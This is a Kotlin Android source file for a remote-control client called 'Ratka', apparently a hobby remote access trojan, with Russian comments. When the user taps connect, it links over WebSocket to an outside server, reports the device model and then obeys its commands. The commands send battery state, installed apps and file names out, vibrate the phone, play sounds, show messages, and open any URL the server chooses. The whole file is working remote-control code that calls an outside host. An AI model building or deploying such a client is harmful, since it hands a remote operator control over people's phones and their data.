package com.ratka.client

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.RingtoneManager
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.VibrationEffect
import android.os.Vibrator
import android.util.Log
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import okhttp3.*
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class MainActivity : Activity() {
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()
    private var webSocket: WebSocket? = null
    private var statusText: TextView? = null
    
    // ВОТ ТУТ ПРЯМОЙ WEBSOCKET БЕЗ SOCKET.IO
    private val wsUrl = "wss://sanya-tech.cc.cd/ws"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(32, 32, 32, 32)
        }
        statusText = TextView(this).apply { text = "Ожидание подключения..." }
        val btnConnect = Button(this).apply {
            text = "Подключиться к Ратке"
            setOnClickListener { connectWebSocket() }
        }
        layout.addView(statusText)
        layout.addView(btnConnect)
        setContentView(layout)
    }

    private fun connectWebSocket() {
        val request = Request.Builder().url(wsUrl).build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                runOnUiThread { statusText?.text = "Подключено к Ратке" }
                // Отправляем чистый JSON при подключении
                val hello = JSONObject().apply {
                    put("type", "connect")
                    put("device_type", "android")
                    put("model", Build.MODEL)
                }
                webSocket.send(hello.toString())
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d("RATKA", "Получено: $text")
                try {
                    val json = JSONObject(text)
                    when (json.optString("cmd")) {
                        "battery" -> sendBatteryInfo(webSocket)
                        "vibrate" -> vibratePhone()
                        "toast" -> showToast(json.optString("text", "Привет от Ратки!"))
                        "open_url" -> openUrl(json.optString("url", "https://google.com"))
                        "sound" -> playSound()
                        "apps" -> sendInstalledApps(webSocket)
                        "files" -> sendDownloads(webSocket)
                    }
                } catch (e: Exception) {
                    Log.e("RATKA", "Ошибка", e)
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                runOnUiThread { statusText?.text = "Ошибка: ${t.message}" }
                Log.e("RATKA", "WebSocket ошибка", t)
            }
        })
    }

    private fun sendBatteryInfo(ws: WebSocket) {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        
        val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus: Intent? = registerReceiver(null, ifilter)
        val temp = (batteryStatus?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0
        val status = if (bm.isCharging) "Заряжается" else "От батареи"

        ws.send(JSONObject().apply {
            put("type", "battery")
            put("level", level)
            put("temp", temp)
            put("status", status)
        }.toString())
    }

    private fun vibratePhone() {
        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(2000, VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            @Suppress("DEPRECATION")
            vibrator.vibrate(2000)
        }
        runOnUiThread { statusText?.text = "Вибрация 2 секунды" }
    }

    private fun showToast(text: String) {
        runOnUiThread { Toast.makeText(this, text, Toast.LENGTH_LONG).show() }
    }

    private fun openUrl(url: String) {
        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
        startActivity(intent)
        runOnUiThread { statusText?.text = "Открыта ссылка: $url" }
    }

    private fun playSound() {
        val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
        val ringtone = RingtoneManager.getRingtone(applicationContext, uri)
        ringtone.play()
        runOnUiThread { statusText?.text = "Проигран звук" }
    }

    private fun sendInstalledApps(ws: WebSocket) {
        val pm = packageManager
        val apps = pm.getInstalledApplications(0).map { it.packageName }.filter { !it.startsWith("android.") }
        ws.send(JSONObject().apply {
            put("type", "apps")
            put("list", JSONArray(apps.take(30)))
        }.toString())
    }

    private fun sendDownloads(ws: WebSocket) {
        val dir = getExternalFilesDir(null)
        val files = dir?.listFiles()?.map { it.name } ?: emptyList()
        ws.send(JSONObject().apply {
            put("type", "files")
            put("list", JSONArray(files))
        }.toString())
    }
}
